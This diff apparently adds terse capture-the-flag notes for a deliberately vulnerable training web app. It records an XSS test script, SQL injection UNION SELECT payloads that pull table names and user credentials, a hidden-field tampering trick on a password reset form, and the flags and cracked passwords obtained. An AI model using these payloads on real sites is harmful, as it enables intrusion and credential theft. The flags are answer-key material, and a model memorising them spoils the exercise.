@@ -1,0 +1,11 @@
+<script>alert('test');</script> in guestbook fields : 0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e
+
+1 ORDER BY 2 -> nb columns
+1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns dans id members
+1 AND 1=2 UNION SELECT Commentaire, countersign FROM users
+
+sql injection sur member id : 10A16D834F9B1E4068B25C4C46FE0284E99E44DCEAF08098FC83925BA6310FF5 (fortytwo)
+
+similar, but in list_images instead: F2A29020EF3132E01DD61DF97FD33EC8D7FCD1388CC9601E7DB691D17D4D6188 (albatroz)
+
+forgot password ->  <input type="hidden" name="mail" value="webmaster@borntosec.com" maxlength="15"> change value : 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0 
